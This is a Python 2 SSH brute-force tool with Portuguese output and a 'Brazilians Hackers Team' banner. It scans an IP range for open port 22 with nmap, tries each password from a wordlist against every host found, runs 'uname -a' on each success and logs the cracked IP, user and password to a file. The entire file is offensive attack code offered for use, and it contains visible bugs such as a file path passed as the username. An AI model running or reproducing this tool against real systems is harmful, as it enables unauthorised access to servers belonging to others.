#!/usr/bin/python
#####################
#SSH BruteForcer    #
# IP range          #
#####################
import sys, time, StringIO, commands, re
save_file = "LoginsSSH.txt"
verbose = 1
user = "/root/exploits/usersSSH.txt"


try:
	import pexpect, pxssh
except(ImportError):
	print "\n Voce Precisa Do Pexpect Modulo."
	print " http://www.noah.org/wiki/Pexpect \n"
	sys.exit(1)
	
def scan():
	ips = []
	args = 'nmap -P0 '+ip_range+' -p 22 -open | grep open -B 3'
	nmap = StringIO.StringIO(commands.getstatusoutput(args)[1]).readlines()
	for tmp in nmap:
		ipaddr = re.findall("\d*\.\d*\.\d*\.\d*", tmp)
		if ipaddr:
	    		ips.append(ipaddr[0])
	return ips

def brute(ip, word):
	if verbose != 0:
		print " Testando --> ",word
     	try:
        	s = pxssh.pxssh()
        	s.login (ip, user, word, login_timeout=10)
        	s.sendline (command)
        	s.prompt()
        	print "\n",s.before
        	s.logout()
		print "\t[!] Login Com Sucesso: Login -->",user,"  Senha -->",word,"\n"
		logins.writelines(" SSH Login: "+ip+":22 Usuario:"+user+"Senha:"+word+"\n")
   	except Exception, e:
        
		pass
	except KeyboardInterrupt:
		print "\n[-] Saindo... \n"
		logins.close()
		sys.exit(1)

time.sleep(0.9)
print "\n"
print "\n\t #######################################   "
print "\n\t ###         Brute Force SSH         ###   "
print "\n\t ### *** Brazilians Hackers Team *** ###   "
print "\n\t ###       Skype: BrazilObscure      ###   "
print "\n\t ###            IP Range             ###   "
print "\n\t #######################################   "
print "\n"
time.sleep(0.9)
print "\t          Iniciando... "
time.sleep(0.9)
if len(sys.argv) != 3:
	print "\n ---> Tutorial: ./ssh.py 192.168.0.1-999 wordlist.txt"
        print "\n ---> Tutorial: ./ssh.py 192.168.0.1 wordlist.txt"
	sys.exit(1)
ip_range = sys.argv[1]
command = 'uname -a'
time.sleep(0.9)
print "\n"
logins = open(save_file, "a")
print "\n"

try:
	words = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "\n[-] ERRO : Selecione O Local De Sua Wordlist \n"
  	sys.exit(1)

print "\n[+] Carregado: ",len(words),"senhas"
print "[+] Usuario: ",user
print "[+] Arquivo Salvo: ",save_file
if verbose != 0:
	print "[+] Modo Verbose: On"
else:
	print "[+] Modo Verbose: Off"
print "[+] Scaneando: ",ip_range
print "\n"
print "    Aguarde... "

ips = scan()
if len(ips) <= 0:
	print "\n[-] SSH Nao Esta Rodando Nesse IP \n"
	sys.exit(1)
else:
	print "\n[+] Encontrado: ",len(ips),"IP's Rodando SSH"

for ip in ips:
	print "[+] Brute Force: ",ip,"\n"
	for word in words:
	
		time.sleep(0.5)
		brute(ip, word.replace("\n",""))
logins.close()
print "\n[-] Concluido \n"